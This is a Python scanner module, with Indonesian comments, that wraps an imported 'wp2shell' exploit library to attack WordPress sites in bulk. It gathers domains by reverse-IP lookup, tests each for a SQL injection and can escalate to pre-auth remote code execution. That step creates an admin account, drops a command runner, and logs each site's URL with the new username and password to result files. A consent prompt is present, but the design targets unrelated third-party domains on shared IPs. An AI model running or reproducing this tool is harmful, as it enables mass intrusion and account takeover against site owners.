# wp2shell_scanner.py - WordPress wp2shell scanner for continuous scan mode
# Interface mengikuti modul tunggal /root/workspace/wp2shell/wp2shell.py
# (class WordPressTarget / Exploit / Operator + check_target / create_admin_and_run)
import os
import sys
import re
import time
import threading
from urllib.parse import urlparse

# ---- Import modul wp2shell riil (fallback path) ----
# wp2shell.py ada di /root/workspace/wp2shell/. Pastikan importable.
_WS_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
if os.path.isdir(os.path.join(_WS_PATH, "wp2shell")):
    _wp2dir = os.path.join(_WS_PATH, "wp2shell")
    if _wp2dir not in sys.path:
        sys.path.insert(0, _wp2dir)

try:
    import wp2shell
    from wp2shell import WordPressTarget, Exploit, Operator, check_target, create_admin_and_run
    _WP2SHELL_OK = True
    _WP2SHELL_ERR = ""
except Exception as _e:
    _WP2SHELL_OK = False
    _WP2SHELL_ERR = str(_e)

# Konfigurasi output
OUTPUT_DIR = "wp2shell_results"
VULN_FILE = os.path.join(OUTPUT_DIR, "wp2shell_vuln.txt")
RCE_FILE = os.path.join(OUTPUT_DIR, "wp2shell_rce.txt")
_write_lock = threading.RLock()


def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)


def append_result(path, line):
    ensure_dirs()
    with _write_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line.rstrip() + '\n')


def ensure_scheme(url):
    url = (url or '').strip()
    if not url:
        return ''
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')


def confirm_authorization(url, action):
    """Konfirmasi izin untuk menjalankan RCE"""
    print(f"\n[!] AUTHORIZATION REQUIRED: {action} on {url}")
    print("    This creates a WordPress admin account and drops a command runner.")
    print("    Proceed only on targets you own or are authorized to test.")
    ans = input("    [y/N]: ").strip().lower()
    return ans in ('y', 'yes')


class Wp2shellScanner:
    """Scanner untuk WordPress wp2shell pada domain hasil reverse IP"""

    def __init__(self, cache_manager, main_reference=None, timeout=40.0, do_rce=False):
        self.cache_manager = cache_manager
        self.main = main_reference
        self.timeout = timeout
        self.do_rce = do_rce
        self.found_urls = set()
        self.lock = threading.Lock()
        self.total_domains = 0
        self.total_vuln = 0
        self.total_rce = 0

        if not _WP2SHELL_OK:
            print(f"[!] wp2shell module import FAILED: {_WP2SHELL_ERR}")
            print(f"    Ensure /root/workspace/wp2shell/wp2shell.py is reachable.")

    # ---- Low-level check menggunakan check_target() riil ----
    def check_wordpress(self, url):
        """
        Return dict status:
          {'vuln': bool, 'reason': str, 'method': str|None}
        check_target() return:
          0 = vulnerable, 1 = not, 2 = DoS-only (WP 6.8.x batch fatal)
        """
        if not _WP2SHELL_OK:
            return {'vuln': False, 'reason': 'wp2shell_not_imported', 'method': None}

        url = ensure_scheme(url)
        if not url:
            return {'vuln': False, 'reason': 'empty_url', 'method': None}

        try:
            target = WordPressTarget(url, http_timeout=self.timeout)
            rc = check_target(target)
        except Exception as e:
            return {'vuln': False, 'reason': f'probe_error: {str(e)[:80]}', 'method': None}

        if rc == 0:
            return {'vuln': True, 'reason': 'confirmed', 'method': target.mode or 'auto'}
        elif rc == 2:
            return {'vuln': False, 'reason': 'dosa_only_wp68', 'method': None}
        else:
            return {'vuln': False, 'reason': 'not_vulnerable', 'method': None}

    # ---- RCE via create_admin_and_run ----
    def attempt_rce(self, url, command="id"):
        """
        Return dict:
          {'ok': bool, 'login': str|None, 'secret': str|None, 'mail': str|None,
           'output': str, 'reason': str|None}
        """
        if not _WP2SHELL_OK:
            return {'ok': False, 'login': None, 'secret': None, 'mail': None,
                    'output': '', 'reason': 'wp2shell_not_imported'}

        url = ensure_scheme(url)
        try:
            target = WordPressTarget(url, http_timeout=self.timeout)
            # arm dulu supaya mode extraction benar
            target.arm("auto")
            login, secret, mail, output = create_admin_and_run(target, command)
        except Exception as e:
            return {'ok': False, 'login': None, 'secret': None, 'mail': None,
                    'output': '', 'reason': str(e)[:120]}

        ok = bool(output and ('uid=' in output or 'gid=' in output or 'root' in output or 'www' in output))
        return {'ok': ok, 'login': login, 'secret': secret, 'mail': mail,
                'output': (output or '')[:300], 'reason': None if ok else 'no_uid_in_output'}

    # ---- Public: proses satu domain ----
    def process_domain(self, domain):
        url = ensure_scheme(domain)
        if not url:
            return None

        # Cek cache
        cache_key = f"wp2shell_{url}"
        cached = self.cache_manager.get_reverse_cache(cache_key)
        if cached:
            return cached

        chk = self.check_wordpress(url)
        if not chk['vuln']:
            self.cache_manager.save_reverse_cache(
                cache_key,
                {'vuln': False, 'reason': chk['reason'], 'method': chk.get('method')},
                'wp2shell'
            )
            return None

        # VULNERABLE
        result = {
            'vuln': True,
            'url': url,
            'method': chk.get('method'),
            'rce': False,
            'user': None,
            'password': None
        }

        vuln_line = f"{url} [wp2shell] SQLi confirmed via {chk.get('method')}"
        append_result(VULN_FILE, vuln_line)

        if self.do_rce:
            authorized = False
            if self.main and hasattr(self.main, 'rce_authorized') and self.main.rce_authorized:
                authorized = True
            else:
                authorized = confirm_authorization(url, "attempt pre-auth RCE via wp2shell")

            if authorized:
                print(f"[*] Attempting RCE on {url}...")
                rce = self.attempt_rce(url, "id")
                if rce['ok']:
                    result['rce'] = True
                    result['user'] = rce['login']
                    result['password'] = rce['secret']
                    rce_line = (f"{url} [RCE] user={rce['login']} "
                                f"pass={rce['secret']} out={rce['output'][:120]}")
                    append_result(RCE_FILE, rce_line)
                    append_result(VULN_FILE, f"{url} [wp2shell-rce] {rce_line}")
                    if self.main:
                        self.main.increment_wp2shell_rce()
                    print(f"[+] RCE SUCCESS on {url} -> {rce['login']}")
                else:
                    print(f"[-] RCE failed on {url}: {rce['reason']}")

        self.cache_manager.save_reverse_cache(cache_key, result, 'wp2shell')

        if self.main:
            self.main.increment_wp2shell()

        return result

    # ---- Public: proses satu IP ----
    def process_ip(self, ip):
        if self.cache_manager.is_ip_processed(ip):
            print(f"[↺] Skipping cached IP: {ip}")
            return

        print(f"\n[*] Processing IP: {ip} for wp2shell")

        scanner = None
        if self.main and hasattr(self.main, 'scanner'):
            scanner = self.main.scanner
        else:
            print("[!] Scanner (MovableTypeScanner) not available for reverse IP")
            self.cache_manager.mark_ip_processed(ip, 'no_scanner')
            return

        # PATCH: tntcode DICABUT (Cloudflare) — pakai hackertarget saja
        try:
            domains_ht = scanner.reverse_ip_hackertarget(ip) or []
        except Exception as e:
            print(f"[-] Hackertarget reverse error: {e}")
            domains_ht = []

        all_domains = set(domains_ht)

        if not all_domains:
            print(f"[-] No domains for IP {ip}")
            self.cache_manager.mark_ip_processed(ip, 'no_domains')
            return

        print(f"[+] Total domains: {len(all_domains)} (HT: {len(domains_ht)})")

        found_count = 0
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.process_domain, domain) for domain in all_domains]
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=120)
                    if result and result.get('vuln'):
                        found_count += 1
                        if result.get('rce'):
                            self.total_rce += 1
                except Exception as e:
                    print(f"[-] Error processing domain: {e}")

        print(f"[+] IP {ip}: {found_count} wp2shell vulnerable domains found")
        self.cache_manager.mark_ip_processed(ip, 'success' if found_count else 'empty')
